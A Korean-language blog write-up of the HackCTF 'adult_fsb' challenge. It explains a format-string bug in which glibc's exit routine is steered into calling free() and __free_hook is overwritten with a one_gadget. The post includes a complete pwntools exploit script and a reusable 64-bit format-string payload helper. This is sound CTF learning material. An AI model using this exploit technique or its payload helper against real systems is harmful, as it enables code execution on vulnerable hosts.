---
layout: post
title:  "HacCTF adultfsb write-up"
date:   2020-03-24 19:45:55
image:  hackctf_adultfsb.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled.png)

RELRO와 NX가 걸려있다. PIE가 걸려있지는 않지만 FUll RELRO이기 떄문에 got overwrite는 불가능하다

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled%201.png)

총 두번의 입력과 각각 출력을 해준다.

<br>

**3) 코드흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled%202.png)

for문으로 총 2번 반복을 하게 된다. read로 0x12c 만큼 입력을 받은뒤, printf로 출력을 한다. 여기서 서식문자가 없으므로 fsb가 터질 것이다.


<br><br><br>


### 2. 접근방법

---

FULL RELRO이기 때문에 GOt overrwrit가 불가능하다.  따라서 exit함수를 이용해야한다.

exit 코드를 분석할 필요가 있는데 결로적으로 exit 내부에서 특정 조건에 해당됬을 때 호출되는 free를 이용하여 free_hook을 one_gadget으로 덮는 것이 목적이다.

<br>

1. **exit.c 소스코드 간단분석**

``` c
..
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
..
``` 
- exit함수가 호출되면 내부에서 __run_exit_handlers 함수를 호출함

<br>

    
```c    
        __run_exit_handlers (int status, struct exit_function_list **listp,
                             bool run_list_atexit, bool run_dtors)
        {
          /* First, call the TLS destructors.  */
        #ifndef SHARED
          if (&__call_tls_dtors != NULL)
        #endif
            if (run_dtors)
              __call_tls_dtors ();
          /* We do it this way to handle recursive calls to exit () made by
             the functions registered with `atexit' and `on_exit'. We call
             everyone on the list and use the status value in the last
             exit (). */
          **while (true) -------------> 1**
            {
              struct exit_function_list *cur;
              __libc_lock_lock (__exit_funcs_lock);
            restart:
              cur = *listp;
              if (cur == NULL)
                {
                  /* Exit processing complete.  We will not allow any more
                     atexit/on_exit registrations.  */
                  __exit_funcs_done = true;
                  __libc_lock_unlock (__exit_funcs_lock);
                  break;
                }
              **while (cur->idx > 0) -------------> 2**
                {
        ...
```


- 첫번째 while문으로 들어온다. exit_function_list 구조체의 cur포인터변수를 하나 선언하고 두번째 while에서 cur→idx가 0보다 큰지 작은지 검사한다.<br><br>


- 해당 조건에 만족하면 내부적으로 복잡한 로직이 실행되는데 이는 free함수가 실행되는 부분과는 상관없으므로 cur→idx 값이 0 이하가 되도록 번경해야함<br><br>
- 디버깅

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled%203.png)

    cur→idx 부분이 [r13+0x8]에 존재하고 이를 rax에 넣는다. test rax,rax를 수행하여 rax값이 현재 1이므로 현 상태로는 2번째 while안으로 들어갈 것이다. 따라서 저 initail+8 의 갑을 0으로 fsb를 이용하여 넣어줘야함

    ...
    *listp = cur->next;
          if (*listp != NULL)
            /* Don't free the last element in the chain, this is the statically
               allocate element.  */
            free (cur);
    ...<br><br>

- cur→idx가 0이하의 값이라면 while문을 건너띄고 위 로직이 실행된다. cur→next에 담긴 값을 listp포인터 변수에 넣고 해당 값이 NULL인지 아닌지 검사한다
- 해당 값이 NULL이 아니면 free함수가 실행된다.
- 우리는 cur→next의 값을 디버깅하여 확인한뒤, 디폴터 값이 0이면 해당 값을 아무값이나 변경해야한다
- 그다음 free_hook을 one_gadget으로 덮는다<br><br>
- 디버깅

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled%204.png)

    원래 디폴트로는 [r13+0x00] 에 0이 들어가 있다. 따라서 해당 로직으로 분기를 하지 않지만 위의 test rax,rax를 진행할때 " set $rax=0 " gdb 명령어로 rax값을 변경하였다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled%205.png)

    따라서 free함수가 호출되는 것을 확인할 수 있다. 우리는 이제 free_hook을 덮기만 하면 된다.

<br><br>

2. **시나리오**
    1. **libc_주소 leak하기**
        - 보통 메인함수가 다 수행되고 ret를 하는 위치가 libc_start_main+240이다. 따라서 ret를 leak하여 libc_base를 구하자

            ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled%206.png)

            ⇒ %49$p로 해당 값을 leak 가능

    2. **exit 루틴에서 필요한 두가지 조건 맞춰주기**
        - inital+8 값을 0으로 만들기 ⇒ libc_base에서 offset으로 거리를 구한뒤 fsb로 0삽입
        - inital+0 에 아무값 넣기 ⇒ libc_base에서 offset으로 거리를 구한뒤 fsb로 삽입
        - one_gadget(6바이트)를 $hn 를 이용하여 2바이트 씩 3개로 쪼개서 fsb로 삽입<br>

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20adultfsb/Untitled%207.png)

        - 위 로직이 정상적으로 진행된다면 위 사진과 같이 cur→idx (initial+8) 에 0이 들어가고, cur→next(initial) 에 NULL이 아닌 값이 들어가 있다.
        - 또한 free_hook에도 one_gadget이 잘 들어가있다.



<br><br><br>

### 3. 풀이

---

최종익스코드는 다음과 같다
```python
    from pwn import *
    context(arch="amd64",os="linux",log_level="DEBUG")
    #p=remote("ctf.j0n9hyun.xyz",3040)
    p=process("./adult_fsb")
    gdb.attach(p,'code\nb *0x755+$code\n')
    
    e=ELF("./adult_fsb")
    libc=ELF("./libc.so.6")
    
    payload = "%49$p"
    pause()
    p.send(payload)
    libc_start=int(p.recv(14),16)
    #log.info(hex(libc.symbols['__libc_start_main']))
    libc_base=libc_start-0x20830
    log.info(hex(libc_start))
    log.info(hex(libc_base))
    
    one_gadget=libc_base+0x4526a
    one_gadget_low=one_gadget&0xffff
    one_gadget_middle = (one_gadget >> 16) & 0xffff
    one_gadget_high = (one_gadget >> 32) &0xffff
    
    log.info("one_gadget::"+hex(one_gadget))
    log.info("one_gadget_low::"+hex(one_gadget_low))
    log.info("one_gadget_mid::"+hex(one_gadget_middle))
    log.info("one_gadget_high::"+hex(one_gadget_high))
    
    low = one_gadget_low
    
    if one_gadget_middle > one_gadget_low:
        middle = one_gadget_middle - one_gadget_low
    else:
        middle = 0x10000 + one_gadget_middle - one_gadget_low
    
    if one_gadget_high > one_gadget_middle:
        high = one_gadget_high - one_gadget_middle
    else:
        high = 0x10000 + one_gadget_high - one_gadget_middle
    
    low=low-14
    middle=middle-3
    high=high-3
    
    payload2 = "%17$ln"+"AA"+"%5c%18$ln"+"A"*7
    payload2 += "%"+str(low)+"c%19$hn"+"A"*3
    payload2 += "%"+str(middle)+"c%20$hn"+"A"*3
    payload2 += "%"+str(high)+"c%21$hn"+"A"*3
    payload2 += p64(libc_base+0x3C5C48)+p64(libc_base+0x3C5C40)
    payload2 += p64(libc_base+0x3C67A8)+p64(libc_base+0x3C67A8+2)+p64(libc_base+0x3C67A8+4)
    pause()
    
    p.sendline(payload2)
    sleep(2)
    p.interactive()
```

<br><br><br>
    

### 4. 몰랐던 개념

---

- exit함수에도 free가 내부에서 호출될수 있었다.
- 다양한 방법의 fsb가 가능함
- 6바이트는 2바이트 씩 $hn으로 쪼개서 넣어줘야함. 그냥 $ln으로 넣으라다가 삽질함
- fsb을 쉽게 사용할 수 있는 함수가 존재 

```python
def fmt(prev , target):
if prev < target:
    result = target - prev
    return "%" + str(result)  + "c"
elif prev == target:
    return ""
else:
    result = 0x10000 + target - prev
    return "%" + str(result) + "c"

def fmt64(offset, addr, value):
payload = ''
prev = 0

if (offset == 6 and value == 0):
    payload += '%7$ln' + 'AAA'
    payload += p64(addr)
    return payload

for i in range(3):
    target = (value >> (i * 16)) & 0xffff
    
    if prev < target:
        payload += '%{}c'.format(target - prev)
    elif prev > target:
        payload += '%{}c'.format(0x10000 + target - prev)

    payload += '%xx$hn'
    prev = target

payload += 'A' * (8 - len(payload) % 8)

for i in range(3):
    idx = payload.find("%xx$hn")
    off = offset + (len(payload) / 8) + i
    payload = payload[:idx] + '%{}$hn'.format(off) + payload[idx+6:]

for i in range(3):
    payload += p64(addr + i * 2)

return payload
```
- 출처 : [https://blog.naver.com/yjw_sz/221870980708](https://blog.naver.com/yjw_sz/221870980708)

- 참고사이트
    1. [https://blog.ba0bab.kr/172](https://blog.ba0bab.kr/172)
    2. [https://m.blog.naver.com/PostView.nhn?blogId=yjw_sz&logNo=221559719664&proxyReferer=http%3A%2F%2F211.55.147.235%2Ftm%2Fnt%2Fnewchada.das](https://m.blog.naver.com/PostView.nhn?blogId=yjw_sz&logNo=221559719664&proxyReferer=http%3A%2F%2F211.55.147.235%2Ftm%2Fnt%2Fnewchada.das)